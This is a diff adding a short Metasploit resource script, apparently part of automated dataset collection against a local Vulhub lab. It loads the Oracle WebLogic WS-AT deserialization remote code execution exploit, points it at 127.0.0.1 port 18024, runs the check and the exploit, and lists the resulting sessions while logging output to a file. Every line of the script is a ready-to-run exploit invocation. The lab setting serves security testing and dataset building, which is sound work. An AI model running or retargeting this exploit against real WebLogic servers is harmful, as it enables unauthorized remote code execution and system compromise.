@@ -1,0 +1,14 @@
+spool /home/kali/dataset/dec-vulhub-2026-08-05/raw/metasploit/weblogic_10271/scan.stdout
+use exploit/multi/http/oracle_weblogic_wsat_deserialization_rce
+set RHOSTS 127.0.0.1
+set RPORT 18024
+set LHOST 127.0.0.1
+set TARGETURI /
+set SSL false
+set VERBOSE true
+check
+run -j
+sleep 25
+sessions
+spool off
+exit
